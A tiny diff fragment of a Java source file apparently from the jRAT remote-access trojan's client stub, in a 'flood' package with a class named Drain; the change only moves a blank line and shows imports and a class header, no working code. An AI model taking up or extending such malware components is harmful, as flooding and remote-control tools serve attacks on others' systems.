@@ -1,9 +1,9 @@
 package pro.jrat.stub.flood;
+
 import java.io.BufferedInputStream;
 import java.net.URL;
 
 import pro.jrat.stub.Constants;
-
 
 public class Drain implements Runnable {
 
